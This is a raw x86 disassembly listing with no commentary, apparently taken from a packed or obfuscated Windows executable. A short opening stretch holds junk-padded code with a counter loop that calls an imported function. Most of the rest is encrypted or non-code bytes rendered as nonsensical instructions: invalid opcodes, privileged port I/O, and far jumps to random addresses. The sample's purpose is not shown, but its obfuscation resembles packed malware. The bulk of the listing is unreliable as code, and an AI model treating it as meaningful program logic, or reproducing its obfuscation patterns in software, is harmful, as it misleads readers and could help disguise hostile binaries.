  4027d3:	xor    ecx,ebx
  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   edx,DWORD PTR [ebx],0x7aed6319
  4028df:	jp     0x40295b
  4028e1:	jp     0x4028ed
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x15],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1542f8bf
  40298a:	aaa    
  40298b:	add    al,0xfd
  40298d:	ds scas eax,DWORD PTR es:[edi]
  40298f:	or     BYTE PTR [edi*2+0x44453067],bl
  402996:	sub    DWORD PTR fs:[ebx-0x6dc09143],eax
  40299d:	sub    dl,BYTE PTR [esi+0x2d53feb]
  4029a3:	and    al,0xca
  4029a5:	sub    eax,0xabe3d809
  4029aa:	mov    cl,0x7c
  4029ac:	mov    edi,0xe2ebe780
  4029b1:	das    
  4029b2:	inc    ebx
  4029b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029b4:	cmp    BYTE PTR [edx-0x35051928],0xf0
  4029bb:	mov    al,0x6e
  4029bd:	cmp    al,0xd3
  4029bf:	jno    0x40297e
  4029c1:	xor    eax,0x76586572
  4029c6:	mov    cl,0xe6
  4029c8:	js     0x4029b3
  4029ca:	pop    ebp
  4029cb:	add    eax,0x5944a22d
  4029d0:	das    
  4029d1:	ficom  DWORD PTR [ebx-0x26172f1c]
  4029d7:	or     al,0xd9
  4029d9:	mov    eax,ds:0x4979d181
  4029de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029df:	dec    esp
  4029e0:	mov    BYTE PTR [edx-0x1e397c57],bh
  4029e6:	inc    ebx
  4029e7:	clc    
  4029e8:	and    al,0x8e
  4029ea:	ins    DWORD PTR es:[edi],dx
  4029eb:	ins    DWORD PTR es:[edi],dx
  4029ec:	inc    ebx
  4029ed:	stos   DWORD PTR es:[edi],eax
  4029ee:	nop
  4029ef:	int3   
  4029f0:	push   esi
  4029f1:	mov    ds:0x4304437d,al
  4029f6:	jg     0x4029ab
  4029f8:	jae    0x402a2b
  4029fa:	pop    es
  4029fb:	shl    DWORD PTR [edi+0x42],0xfd
  4029ff:	dec    ecx
  402a00:	push   eax
  402a01:	call   0x27d26a7f
  402a06:	in     eax,dx
  402a07:	dec    eax
  402a08:	gs xor eax,0x7c69f04f
  402a0e:	xchg   ecx,eax
  402a0f:	pop    ebx
  402a10:	repz pop edx
  402a12:	sub    edi,ebp
  402a14:	addr16 retf 0x2e16
  402a18:	dec    edx
  402a19:	jg     0x4029f3
  402a1b:	push   edi
  402a1c:	mov    esi,0x9f5f3dbe
  402a21:	push   DWORD PTR [ecx]
  402a23:	push   es
  402a24:	or     DWORD PTR [edi+0x2b],ebp
  402a27:	xchg   esp,eax
  402a28:	sbb    DWORD PTR [ebx-0x50],esp
  402a2b:	or     ebp,esi
  402a2d:	rol    BYTE PTR [ecx+0x2fa1bf86],1
  402a33:	ins    BYTE PTR es:[edi],dx
  402a34:	shr    dh,cl
  402a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a37:	jns    0x402a79
  402a39:	pop    ebp
  402a3a:	sahf   
  402a3b:	jmp    0x402a8b
  402a3d:	mov    bh,0x4e
  402a3f:	push   0x45
  402a41:	shr    DWORD PTR [ebx-0x9a24f5b],1
  402a47:	dec    ebx
  402a48:	enter  0x28f,0x58
  402a4c:	call   0xb560:0xbf3ef91a
  402a53:	sub    eax,0x30537ecc
  402a58:	mov    ebx,ebx
  402a5a:	mov    esi,0x949f133d
  402a5f:	dec    ebp
  402a60:	or     eax,0xe8b19c92
  402a65:	sbb    eax,0x8288c361
  402a6a:	dec    esp
  402a6b:	arpl   di,dx
  402a6d:	sbb    al,0x76
  402a6f:	mov    al,al
  402a71:	sbb    esp,DWORD PTR [edx]
  402a73:	push   esi
  402a74:	in     al,0x92
  402a76:	addr16 jle 0x402a7c
  402a79:	sbb    ebp,esp
  402a7b:	das    
  402a7c:	in     al,0xfb
  402a7e:	mov    ds:0x13ab8815,eax
  402a83:	xor    cl,0x65
  402a86:	jns    0x402a96
  402a88:	push   esi
  402a89:	sbb    esi,ecx
  402a8b:	sub    al,0xc3
  402a8d:	jmp    0x402a17
  402a8f:	repz dec edx
  402a91:	xchg   edx,eax
  402a92:	adc    al,0xe7
  402a94:	lahf   
  402a95:	cmp    eax,0xbb20b135
  402a9a:	cmc    
  402a9b:	mov    ds:0x782f4e34,al
  402aa0:	add    cl,bh
  402aa2:	or     DWORD PTR [edx],edi
  402aa4:	shl    DWORD PTR [ecx+edi*1-0x78aaa09f],cl
  402aab:	push   es
  402aac:	mov    edx,0xbed233bf
  402ab1:	rol    DWORD PTR [ebp+0x3b],cl
  402ab4:	xor    dl,BYTE PTR [ecx+eiz*8]
  402ab7:	dec    esi
  402ab8:	imul   edi,DWORD PTR [ecx-0xd],0xffffffb3
  402abc:	cmp    eax,0x5180da7c
  402ac1:	in     al,dx
  402ac2:	or     ecx,DWORD PTR [ecx-0x70b9349b]
  402ac8:	cmc    
  402ac9:	and    dl,dh
  402acb:	cmp    al,0xa5
  402acd:	fnstsw ax
  402acf:	mov    bh,0x48
  402ad1:	or     dh,0xde
  402ad4:	in     eax,0x84
  402ad6:	add    DWORD PTR [edi-0x54],eax
  402ad9:	ror    ebp,1
  402adb:	sub    ebp,DWORD PTR [eax-0x30cf60ed]
  402ae1:	in     al,dx
  402ae2:	push   cs
  402ae3:	push   ss
  402ae4:	mov    esi,0x9e9dbe2c
  402ae9:	loop   0x402b31
  402aeb:	call   0x160a:0xc3c55f00
  402af2:	sti    
  402af3:	xchg   edi,eax
  402af4:	xor    eax,0x68862a72
  402af9:	push   edx
  402afa:	sub    eax,0x6af2cb43
  402aff:	push   ebp
  402b00:	fadd   DWORD PTR [esi+0x16f58ba9]
  402b06:	inc    esi
  402b07:	sub    eax,esi
  402b09:	fwait
  402b0a:	jl     0x402b4f
  402b0c:	pusha  
  402b0d:	ror    DWORD PTR [esi],1
  402b0f:	lock pop es
  402b11:	mov    ds:0xef9e99b8,eax
  402b16:	stos   DWORD PTR es:[edi],eax
  402b17:	cmc    
  402b18:	(bad)
  402b1b:	fdivr  st,st(4)
  402b1d:	pop    ebp
  402b1e:	mov    ds:0xc26b7473,eax
  402b23:	cmp    BYTE PTR [esi],dl
  402b25:	ror    BYTE PTR [edi],0xfb
  402b28:	xor    esp,DWORD PTR [ebx+0x6]
  402b2b:	aam    0xde
  402b2d:	push   edi
  402b2e:	outs   dx,BYTE PTR ds:[esi]
  402b2f:	mov    eax,ds:0x3498abae
  402b34:	mov    ebx,0xc803b4aa
  402b39:	sbb    eax,0xaa3b409
  402b3e:	adc    al,0xb5
  402b40:	out    dx,eax
  402b41:	ret    0x3e31
  402b44:	or     eax,0x881d85bf
  402b49:	push   ecx
  402b4a:	repz xor eax,0xfd2bb9f8
  402b50:	mov    esi,0x7ee9d750
  402b55:	push   cs
  402b56:	iret   
  402b57:	jb     0x402bce
  402b59:	call   0x41d4cecb
  402b5e:	retf   
  402b5f:	inc    esp
  402b60:	mov    WORD PTR [ebp+0x4f],?
  402b63:	mov    bh,0x55
  402b65:	inc    esi
  402b66:	popw   ss
  402b68:	js     0x402bcf
  402b6a:	jbe    0x402b01
  402b6c:	inc    esi
  402b6d:	lahf   
  402b6e:	stos   DWORD PTR es:[edi],eax
  402b6f:	arpl   WORD PTR [ebp-0x2d],di
  402b72:	das    
  402b73:	outs   dx,DWORD PTR ds:[esi]
  402b74:	ins    DWORD PTR es:[edi],dx
  402b75:	xor    dl,0xf8
  402b78:	lods   al,BYTE PTR ds:[esi]
  402b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b7a:	daa    
  402b7b:	bnd jne 0x402b5f
  402b7e:	clc    
  402b7f:	out    dx,eax
  402b80:	retf   0x2c5c
  402b83:	out    dx,al
  402b84:	shr    BYTE PTR [edi-0x57],cl
  402b87:	fistp  WORD PTR [ecx-0x3c]
  402b8a:	sub    bh,BYTE PTR [ebp+0x32]
  402b8d:	and    eax,0x5e1dfea3
  402b92:	arpl   WORD PTR [ecx+eax*8-0x4e],dx
  402b96:	jb     0x402bf9
  402b98:	mov    al,ds:0x1b5c536a
  402b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b9e:	adc    BYTE PTR [ebx-0x77],0x7b
  402ba2:	push   0xffffff81
  402ba4:	shl    BYTE PTR [esi+0x48],1
  402ba7:	sub    ah,BYTE PTR [esi+eiz*8+0x450329d7]
  402bae:	loope  0x402b39
  402bb0:	mov    bh,BYTE PTR [edx+0xa]
  402bb3:	add    al,0x5f
  402bb5:	sub    eax,0x8f3abf99
  402bba:	repnz cmc 
  402bbc:	stos   DWORD PTR es:[edi],eax
  402bbd:	sbb    DWORD PTR [ebx],esi
  402bbf:	add    ecx,0x5
  402bc2:	ins    BYTE PTR es:[edi],dx
  402bc3:	out    0x5a,al
  402bc5:	addr16 in al,0xef
  402bc8:	cmp    al,0xee
  402bca:	push   ecx
  402bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bcc:	dec    ecx
  402bcd:	sbb    DWORD PTR [ecx+ebp*1],eax
  402bd0:	(bad)  [edx+0x37]
  402bd3:	push   cs
  402bd4:	sub    ecx,ebp
  402bd6:	add    BYTE PTR [edi],cl
  402bd8:	nop
  402bd9:	jno    0x402c3f
  402bdb:	shl    BYTE PTR [edx+0x25dbcd0],0x89
  402be2:	mov    ch,0x4b
  402be4:	jg     0x402c5c
  402be6:	in     eax,0x7c
  402be8:	repnz xchg esp,eax
  402bea:	mov    esi,0xc72bb940
  402bef:	(bad)  
  402bf0:	sar    BYTE PTR [ecx-0x3a],0x72
  402bf4:	fsub   QWORD PTR [ebp+0x4987972d]
  402bfb:	loope  0x402b86
  402bfd:	(bad)  
  402bfe:	rol    ebx,1
  402c00:	push   esi
  402c01:	clc    
  402c02:	inc    edi
  402c03:	int    0x35
  402c05:	in     al,dx
  402c06:	jno    0x402b89
  402c08:	loope  0x402c2b
  402c0a:	fdivr  QWORD PTR [eax+ebp*4-0xa]
  402c0e:	push   esp
  402c0f:	mov    cl,al
  402c11:	adc    ebx,esp
  402c13:	pop    ds
  402c14:	ret    0xcaca
  402c17:	jmp    0xf5d2:0x38e4d4f0
  402c1e:	out    dx,eax
  402c1f:	shr    BYTE PTR [edi+0x49096c01],cl
  402c25:	mov    ecx,0x1652eb0f
  402c2a:	pusha  
  402c2b:	ja     0x402c15
  402c2d:	clc    
  402c2e:	mov    dh,al
  402c30:	jecxz  0x402c2c
  402c32:	idiv   BYTE PTR [ecx-0x1a]
  402c35:	sti    
  402c36:	cwde   
  402c37:	mov    ds:0x27cccbe9,eax
  402c3c:	(bad)  
  402c3d:	in     eax,dx
  402c3e:	rol    BYTE PTR [edi-0x395f22ff],1
  402c44:	test   eax,0x48f8062f
  402c49:	mov    ecx,0xd527fa11
  402c4e:	pushf  
  402c4f:	(bad)  
  402c50:	repnz ins DWORD PTR es:[edi],dx
  402c52:	rcr    BYTE PTR [edx+0x48336824],0x60
  402c59:	ficomp WORD PTR fs:[edx+0x21]
  402c5d:	sti    
  402c5e:	mov    eax,0x7fe466ad
  402c63:	es cs xchg edi,eax
  402c66:	xlat   BYTE PTR ds:[ebx]
  402c67:	pop    edi
  402c68:	inc    esp
  402c69:	xchg   ebx,eax
  402c6a:	push   ecx
  402c6b:	jg     0x402cc5
  402c6d:	or     ch,dh
  402c6f:	push   edi
  402c70:	cmc    
  402c71:	or     al,0xd8
  402c73:	mov    ch,BYTE PTR ds:0xc49dd55d
  402c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7a:	inc    eax
  402c7b:	sbb    bh,BYTE PTR [ebp-0x71e46fbd]
  402c81:	sub    edi,DWORD PTR [ebx-0x6e3b26c0]
  402c87:	cmp    esp,ebp
  402c89:	or     DWORD PTR [eax+0x65],edi
  402c8c:	pop    ds
  402c8d:	inc    esp
  402c8e:	cmp    dh,BYTE PTR [eax+0x62c79ccc]
  402c94:	adc    eax,0x5824d4d4
  402c99:	fs jle 0x402d0c
  402c9c:	sub    cl,BYTE PTR [edi+ebp*1-0x80]
  402ca0:	mov    ah,0x5c
  402ca2:	adc    ch,BYTE PTR [esp+edx*2-0x231a8c64]
  402ca9:	lea    eax,[eax-0x1f5412ea]
  402caf:	jnp    0x402cd4
  402cb1:	ss push ebp
  402cb3:	clc    
  402cb4:	fdecstp 
  402cb6:	inc    edi
  402cb7:	in     al,0x32
  402cb9:	lea    ebp,[ebx+0x5d]
  402cbc:	xor    eax,0x7a172e82
  402cc1:	clc    
  402cc2:	iret   
  402cc3:	leave  
  402cc4:	inc    esp
  402cc5:	lds    edi,FWORD PTR [eax+0x532ca62]
  402ccb:	push   esi
  402ccc:	js     0x402c50
  402cce:	sbb    eax,0x688d241
  402cd3:	fnstsw WORD PTR [ebx-0x1688f31]
  402cd9:	xor    BYTE PTR [edx],0xf7
  402cdc:	inc    edx
  402cdd:	test   al,0xd0
  402cdf:	or     BYTE PTR [ebx-0x4e],cl
  402ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce3:	imul   ebx,esp,0x5598a27b
  402ce9:	cwde   
  402cea:	scas   al,BYTE PTR es:[edi]
  402ceb:	xchg   esp,eax
  402cec:	mov    WORD PTR [edx-0x3e],fs
  402cef:	mov    cl,0xb3
  402cf1:	mov    bl,0xa8
  402cf3:	sub    al,0xe4
  402cf5:	dec    ebx
  402cf6:	scas   al,BYTE PTR es:[edi]
  402cf7:	rol    BYTE PTR [edi-0x1efa15fc],cl
  402cfd:	lock out 0xa2,al
  402d00:	mov    edi,0x6686e04f
  402d05:	dec    esp
  402d06:	push   ebp
  402d07:	xor    DWORD PTR [eax-0x6d492162],esp
  402d0d:	dec    ecx
  402d0e:	cli    
  402d0f:	inc    edx
  402d10:	lea    eax,[ecx-0x6bc477c8]
  402d16:	cmp    cl,BYTE PTR [edx+edx*2+0x20]
  402d1a:	inc    ecx
  402d1b:	mov    ch,0x46
  402d1d:	fwait
  402d1e:	mov    esp,0x1b716436
  402d23:	mov    eax,0x1552fbce
  402d28:	mov    edi,0xe2450046
  402d2d:	jbe    0x402cb4
  402d2f:	mov    ds:0x20c865f6,al
  402d34:	loop   0x402d88
  402d36:	xchg   ebp,eax
  402d37:	sub    eax,0x9634f41
  402d3c:	in     al,0x4d
  402d3e:	push   esp
  402d3f:	xor    ebp,DWORD PTR [edx]
  402d41:	out    0x99,al
  402d43:	pushf  
  402d44:	and    eax,0x3bf7988c
  402d49:	in     eax,dx
  402d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d4b:	inc    esi
  402d4c:	and    BYTE PTR [eax],dh
  402d4e:	ins    BYTE PTR es:[edi],dx
  402d4f:	loopne 0x402d43
  402d51:	imul   esi,ecx,0x13149845
  402d57:	pop    esp
  402d58:	push   ebx
  402d59:	(bad)  
  402d5a:	out    0x42,al
  402d5c:	scas   eax,DWORD PTR es:[edi]
  402d5d:	jp     0x402d9c
  402d5f:	or     bl,bh
  402d61:	dec    esp
  402d62:	fbld   TBYTE PTR [ebp-0x11]
  402d65:	sub    DWORD PTR [ecx],0x17
  402d68:	in     al,0x6b
  402d6a:	push   0x3b
  402d6c:	out    dx,al
  402d6d:	in     eax,0x62
  402d6f:	cmp    bl,BYTE PTR ds:0xec671dbf
  402d75:	sbb    BYTE PTR [esi],al
  402d77:	pop    ss
  402d78:	cmp    DWORD PTR [edi+ecx*4+0x3f],edx
  402d7c:	push   0xc0bb8115
  402d81:	jbe    0x402d44
  402d83:	sti    
  402d84:	mov    BYTE PTR [ebp+0x27],dh
  402d87:	iret   
  402d88:	and    BYTE PTR [ebx+ebp*4],0x9
  402d8c:	xchg   edx,eax
  402d8d:	ret    0xca41
  402d90:	imul   esi,ebx,0x499277bf
  402d96:	jb     0x402da7
  402d98:	jno    0x402d52
  402d9a:	inc    esi
  402d9b:	inc    eax
  402d9c:	inc    edx
  402d9d:	std    
  402d9e:	xchg   ebp,esi
  402da0:	loopne 0x402df6
  402da2:	jge    0x402d45
  402da4:	xlat   BYTE PTR ds:[ebx]
  402da5:	pop    ds
  402da6:	or     ah,BYTE PTR [ecx]
  402da8:	stos   DWORD PTR es:[edi],eax
  402da9:	or     al,0x63
  402dab:	je     0x402d7b
  402dad:	xchg   esi,eax
  402dae:	ss mov dh,0x5b
  402db1:	outs   dx,BYTE PTR ds:[esi]
  402db2:	inc    edx
  402db3:	das    
  402db4:	jl     0x402d76
  402db6:	fisubr WORD PTR [ebp+ebx*2-0x5e]
  402dba:	mov    ebx,0x37a9cfeb
  402dbf:	cs lahf 
  402dc1:	push   cs
  402dc2:	je     0x402e1e
  402dc4:	lea    ecx,[edx-0x59]
  402dc7:	popa   
  402dc8:	in     eax,dx
  402dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dca:	test   BYTE PTR [ebx+0x1a1f6582],bl
  402dd0:	xor    ch,BYTE PTR [ecx-0x71a78280]
  402dd6:	retf   
  402dd7:	jp     0x402e02
  402dd9:	pop    ebp
  402dda:	scas   al,BYTE PTR es:[edi]
  402ddb:	cli    
  402ddc:	jnp    0x402dff
  402dde:	out    dx,al
  402ddf:	pop    ss
  402de0:	in     eax,dx
  402de1:	retf   0x6108
  402de4:	inc    esp
  402de5:	out    dx,al
  402de6:	inc    ebx
  402de7:	sbb    ah,BYTE PTR [ebx]
  402de9:	(bad)  
  402dea:	pop    ebx
  402deb:	pop    ebx
  402dec:	cmc    
  402ded:	inc    edi
  402dee:	mov    ebp,0x67f25977
  402df3:	xor    al,0x39
  402df5:	mov    bh,0x28
  402df7:	mov    ds:0xac0d4400,eax
  402dfc:	sbb    DWORD PTR [ecx+eax*4-0x14b91f80],ebx
  402e03:	mov    ds:0x95cb6968,eax
  402e08:	add    dh,ch
  402e0a:	sub    BYTE PTR [ebp-0x1],al
  402e0d:	pop    edx
  402e0e:	addr16 xchg ecx,eax
  402e10:	xchg   ebp,eax
  402e11:	push   edi
  402e12:	fadd   st,st(4)
  402e14:	cmp    DWORD PTR [esi+0x5a],ebp
  402e17:	jecxz  0x402e78
  402e19:	pop    esi
  402e1a:	daa    
  402e1b:	loop   0x402e85
  402e1d:	cmp    dh,bh
  402e1f:	ret    0xa344
  402e22:	aaa    
  402e23:	inc    eax
  402e24:	mov    edx,0xa6f1f33a
  402e29:	cmp    DWORD PTR [ecx],edx
  402e2b:	lds    edx,FWORD PTR [ebx-0x3c]
  402e2e:	aad    0x50
  402e30:	popf   
  402e31:	xlat   BYTE PTR ds:[ebx]
  402e32:	repnz aam 0x2f
  402e35:	mov    dh,0xbe
  402e37:	cld    
  402e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e39:	mov    cl,0x3
  402e3b:	inc    edx
  402e3c:	int3   
  402e3d:	mov    bl,0x6d
  402e3f:	ss xchg esi,eax
  402e41:	aam    0xde
  402e43:	add    ecx,ebx
  402e45:	push   esi
  402e46:	add    dh,al
  402e48:	xor    DWORD PTR [edi+0x28217a7e],0xffffffb7
  402e4f:	mov    ch,0x16
  402e51:	xlat   BYTE PTR ds:[ebx]
  402e52:	and    dl,cl
  402e54:	adc    BYTE PTR [edi],bl
  402e56:	mov    ecx,0x44ce3fc2
  402e5b:	sbb    ah,BYTE PTR [esi-0x4ddbf853]
  402e61:	push   eax
  402e62:	fld    TBYTE PTR [edx-0xc]
  402e65:	inc    WORD PTR [esi]
  402e68:	mov    cl,0x67
  402e6a:	js     0x402eb2
  402e6c:	js     0x402e1b
  402e6e:	mov    edi,0x9da9310
  402e73:	out    0x2b,al
  402e75:	and    eax,edx
  402e77:	sub    al,dl
  402e79:	(bad)  
  402e7a:	and    esi,DWORD PTR ds:0xa3208777
  402e80:	pusha  
  402e81:	cmp    al,BYTE PTR [ecx+0x5ceb3f9b]
  402e87:	(bad)  
  402e88:	xchg   ebx,eax
  402e89:	adc    BYTE PTR [esi-0x6f2c3408],dh
  402e8f:	into   
  402e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e91:	fwait
  402e92:	push   ds
  402e93:	push   ss
  402e94:	jecxz  0x402e87
  402e96:	(bad)  [ebp+0xf9f6c9e]
  402e9c:	sub    ebx,DWORD PTR [ecx+ebx*1-0x2cb43451]
  402ea3:	jmp    0xfc494c77
  402ea8:	add    ebx,ecx
  402eaa:	fiadd  WORD PTR [edi]
  402eac:	lods   al,BYTE PTR ds:[esi]
  402ead:	and    eax,0xaff5d93d
  402eb2:	stc    
  402eb3:	and    DWORD PTR [esi+ebp*8-0x6694c96a],0x9a6a33f6
  402ebe:	into   
  402ebf:	and    bl,BYTE PTR [ecx+0xc]
  402ec2:	and    DWORD PTR [ecx],ebx
  402ec4:	and    al,0x5d
  402ec6:	inc    ecx
  402ec7:	stos   BYTE PTR es:[edi],al
  402ec8:	fld    TBYTE PTR [edi+0x7f]
  402ecb:	das    
  402ecc:	push   0x58c2a186
  402ed1:	mov    ecx,0xa3b50b7c
  402ed6:	out    0x47,eax
  402ed8:	rol    bh,cl
  402eda:	(bad)  
  402edb:	cmp    eax,0x60a17d2d
  402ee0:	pminsw mm6,QWORD PTR [ebx+0x17cdc44f]
  402ee7:	mov    dl,0x5d
  402ee9:	cmp    dl,dl
  402eeb:	aad    0x50
  402eed:	mov    bh,0x1b
  402eef:	ins    DWORD PTR es:[edi],dx
  402ef0:	jle    0x402e7a
  402ef2:	push   esi
  402ef3:	or     dh,ch
  402ef5:	and    eax,0x57290e8b
  402efa:	ja     0x402f25
  402efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402efd:	push   esp
  402efe:	mov    al,ds:0x6cdf73a6
  402f03:	jno    0x402f43
  402f05:	mov    dh,0x6e
  402f07:	jno    0x402ed8
  402f09:	jns    0x402f6e
  402f0b:	es gs pop ebx
  402f0e:	adc    BYTE PTR [esi],dh
  402f10:	jp     0x402e92
  402f12:	outs   dx,BYTE PTR ds:[esi]
  402f13:	sbb    eax,0xcca593ce
  402f18:	xchg   ecx,eax
  402f19:	or     cl,BYTE PTR [eax+0x12c932b3]
  402f1f:	pop    esi
  402f20:	mov    edi,0x9dd19440
  402f25:	pop    esp
  402f26:	dec    ecx
  402f27:	retf   0xab62
  402f2a:	retf   0xffee
  402f2d:	je     0x402f5b
  402f2f:	mov    al,0x2c
  402f31:	fsub   DWORD PTR [edx+0x74]
  402f34:	cmp    DWORD PTR [edx],eax
  402f36:	(bad)  
  402f38:	pop    esi
  402f39:	pop    esi
  402f3a:	imul   esp,DWORD PTR [esi+0x3a3bcbbe],0xffffff84
  402f41:	lea    esp,[eax+0xc]
  402f44:	ret    0x8e0e
  402f47:	jne    0x402ee7
  402f49:	ins    DWORD PTR es:[edi],dx
  402f4a:	jne    0x402ee1
  402f4c:	test   al,0x3d
  402f4e:	data16 aam 0xe7
  402f51:	xchg   edi,eax
  402f52:	call   0x15d4f7be
  402f57:	lock add esp,DWORD PTR [edx]
  402f5a:	and    DWORD PTR [edi-0x68ae4cd9],eax
  402f60:	xor    BYTE PTR [ecx],bl
  402f62:	icebp  
  402f63:	and    ah,0x55
  402f66:	and    edi,DWORD PTR [ebp-0x42ff706b]
  402f6c:	ror    ebp,0xd2
  402f6f:	pop    ss
  402f70:	pop    ebx
  402f71:	add    ecx,ecx
  402f73:	dec    ebx
  402f74:	lock sbb dh,cl
  402f77:	cld    
  402f78:	jbe    0x402f34
  402f7a:	mov    al,0xe1
  402f7c:	call   0xd917:0xebf5e65c
  402f83:	jmp    0xa833:0x7816c82
  402f8a:	out    0x33,eax
  402f8c:	mov    esp,0xd5920dcd
  402f91:	pop    ebx
  402f92:	lea    ebx,[edi-0x77]
  402f95:	pushf  
  402f96:	cmp    al,0xc7
  402f98:	and    edi,DWORD PTR [ecx]
  402f9a:	add    BYTE PTR [ebp-0x30],ah
  402f9d:	jbe    0x402fe3
  402f9f:	int3   
  402fa0:	fisttp DWORD PTR [ebp-0x35]
  402fa3:	mov    bl,0xa1
  402fa5:	or     esp,DWORD PTR [edi-0x7b]
  402fa8:	lea    edx,[esi+0x9]
  402fab:	cs ja  0x402fa6
  402fae:	(bad)  
  402faf:	sti    
  402fb0:	or     al,0xfe
  402fb2:	push   0x10
  402fb4:	out    0x96,al
  402fb6:	test   al,0x9c
  402fb8:	nop
  402fb9:	inc    ecx
  402fba:	into   
  402fbb:	pop    edx
  402fbc:	test   eax,0x3edca915
  402fc1:	adc    eax,0x5af80d81
  402fc6:	stos   BYTE PTR es:[edi],al
  402fc7:	iret   
  402fc8:	in     eax,dx
  402fc9:	push   ebp
  402fca:	adc    cl,BYTE PTR [eax+0x59]
  402fcd:	dec    edx
  402fce:	adc    al,0xb3
  402fd0:	sbb    al,0x92
  402fd2:	aas    
  402fd3:	ror    DWORD PTR [eax+0x40],1
  402fd6:	adc    al,0x5c
  402fd8:	push   esp
  402fd9:	sub    eax,DWORD PTR [ecx]
  402fdb:	(bad)
  402fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe0:	ret    0xb883
